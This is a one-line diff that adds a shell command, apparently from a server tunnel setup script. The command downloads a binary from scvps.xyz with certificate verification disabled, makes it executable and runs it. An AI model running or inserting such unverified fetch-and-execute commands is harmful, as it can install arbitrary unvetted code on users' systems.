@@ -1,0 +1,1 @@
+wget --no-check-certificate scvps.xyz/tunnel ; chmod 755 tunnel ; ./tunnel
